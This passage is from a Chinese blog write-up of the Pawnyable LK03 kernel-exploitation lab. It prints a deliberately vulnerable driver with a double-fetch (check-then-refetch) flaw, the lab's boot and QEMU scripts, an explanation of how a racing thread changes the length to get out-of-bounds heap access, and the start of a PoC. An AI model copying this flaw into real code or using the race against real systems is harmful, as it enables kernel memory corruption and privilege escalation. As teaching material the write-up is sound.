userfaultfd | 可典当！ (pawnyable-cafe.translate.goog)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux Kernel Mode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pawnyable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LK03 Double Fetch</title>
      <link href="/2024/03/03/LK03%20Double%20Fetch/"/>
      <url>/2024/03/03/LK03%20Double%20Fetch/</url>
      
        <content type="html"><![CDATA[<p>LKM源码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"ptr-yudai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Dexter - Vulnerable Kernel Driver for Pawnyable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token string">"dexter"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">0x20</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_GET</span> <span class="token expression"><span class="token number">0xdec50001</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SET</span> <span class="token expression"><span class="token number">0xdec50002</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  filp<span class="token operator">-></span>private_data <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">verify_request</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>reqp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> reqp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>ptr <span class="token operator">||</span> req<span class="token punctuation">.</span>len <span class="token operator">></span> BUFFER_SIZE<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">copy_data_to_user</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>reqp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> reqp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ptr<span class="token punctuation">,</span> filp<span class="token operator">-></span>private_data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">copy_data_from_user</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>reqp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> reqp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>ptr<span class="token punctuation">,</span> req<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">module_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span>                         <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span>                         <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">verify_request</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> CMD_GET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">copy_data_to_user</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_SET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">copy_data_from_user</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span>owner   <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>  <span class="token punctuation">.</span>open    <span class="token operator">=</span> module_open<span class="token punctuation">,</span>  <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>  <span class="token punctuation">.</span>unlocked_ioctl <span class="token operator">=</span> module_ioctl<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefile：</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> dexter.o<span class="token comment">#KBUILD_DIR := /lib/modules/$(KVERSION)/build</span>KBUILD_DIR <span class="token operator">:=</span> /home/ptr/armoury/buildroot/output/build/linux-5.17.1<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="一、LK03-Double-Fetch"><a href="#一、LK03-Double-Fetch" class="headerlink" title="一、LK03 Double Fetch"></a>一、LK03 Double Fetch</h1><h2 id="一-逆向分析"><a href="#一-逆向分析" class="headerlink" title="(一)逆向分析"></a>(一)逆向分析</h2><h3 id="S99pawnyable"><a href="#S99pawnyable" class="headerlink" title="S99pawnyable"></a>S99pawnyable</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>mdev <span class="token parameter variable">-s</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmxstty <span class="token parameter variable">-opost</span><span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrictinsmod /root/dexter.ko<span class="token function">mknod</span> <span class="token parameter variable">-m</span> <span class="token number">666</span> /dev/dexter c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> dexter /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1;&#125;'</span><span class="token variable">`</span></span> <span class="token number">0</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[ Dexter (LK03) - Pawnyable ]"</span>setsid cttyhack setuidgid <span class="token number">1337</span> <span class="token function">sh</span><span class="token function">umount</span> /procpoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr"</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> kvm64,+smep <span class="token punctuation">\</span>    <span class="token parameter variable">-smp</span> <span class="token number">2</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开了smep、kaslr、kpti，没有smap；值得注意的是-smp为2</p><h3 id="dexter-ko"><a href="#dexter-ko" class="headerlink" title="dexter.ko"></a>dexter.ko</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILENo RELRO        No canary found   NX disabled   REL             No RPATH   No RUNPATH   <span class="token number">50</span><span class="token punctuation">)</span> Symbols  No<span class="token number">0</span><span class="token number">0</span>./dexter.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>整个模块的核心代码如下（为突出重点，删除了一些打印、判断和返回语句）：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">0x20</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_GET</span> <span class="token expression"><span class="token number">0xdec50001</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SET</span> <span class="token expression"><span class="token number">0xdec50002</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  filp<span class="token operator">-></span>private_data <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">verify_request</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>reqp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> reqp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>ptr <span class="token operator">||</span> req<span class="token punctuation">.</span>len <span class="token operator">></span> BUFFER_SIZE<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">copy_data_to_user</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>reqp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> reqp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">copy_to_user</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ptr<span class="token punctuation">,</span> filp<span class="token operator">-></span>private_data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">copy_data_from_user</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>reqp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> reqp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">copy_from_user</span><span class="token punctuation">(</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>ptr<span class="token punctuation">,</span> req<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">module_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">verify_request</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> CMD_GET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">copy_data_to_user</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_SET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">copy_data_from_user</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>值得注意的是，我们传入的数据需要是 request_t 结构体类型，大小为0x10；同时在ioctl时会检查req.ptr非空且req.len&lt;&#x3D;0x20。</p><p>在close时没有清除堆指针，存在UAF</p><h2 id="二-利用思路"><a href="#二-利用思路" class="headerlink" title="(二)利用思路"></a>(二)利用思路</h2><p>考虑这样一种情况：如果用户空间进程首先传入一个完全合法的request_t结构体，其中的ptr和len都是符合上述内核模块要求的，很显然这个结构体能够通过verify_request的检查。但假如在刚通过检查后和模块真正进行读写操作之前，用户空间进程修改了该结构体中的len成员的值，情况会怎么样呢？</p><p>答案是，上述操作可能造成堆越界读或越界写。</p><h3 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h3><p><strong>Double Fetch</strong>是内核空间中发生的一种数据竞争类型的名称。顾名思义，是指在内核端两次取（读）同一个数据时发生的冲突。  </p><p>当内核空间从用户空间读取相同的数据两次时，另一个线程可能会重写中间的数据：（图片来自论文：<a href="https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/wang-pengfei">How Double-Fetch Situations turn into Double-Fetch Vulnerabilities: A Study of Double Fetches in the Linux Kernel | USENIX</a>）<br><img src="/EXP_FILE/4fb5d1678f8d6ed206c514b6eee06482_MD5.jpeg"><br>此时，第一次和第二次读取的数据内容不同，导致不一致。这种数据竞争称为双重获取</p><blockquote><p>在现代Linux操作系统中，用户空间与内核空间的数据交换非常频繁。简单的变量可以直接按值传递，但是系统常常需要从用户空间向内核空间传递复杂的数据结构，并且需要先对传入的数据进行校验和预处理。在这种情况下，一开始被传递的可能并不是数据本身，只是指向结构体的指针，具体数据仍然存在于用户空间留待后续处理。如果攻击者在内核检查和使用数据的过程之间有机会改动待传入数据，就可能绕过内核中的相应检查机制。</p></blockquote><hr><p>作者的poc，尝试触发double fetch：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token class-name">request_t</span> req<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  req<span class="token punctuation">.</span>ptr <span class="token operator">=</span> buf<span class="token punctuation">;</span>  req<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token 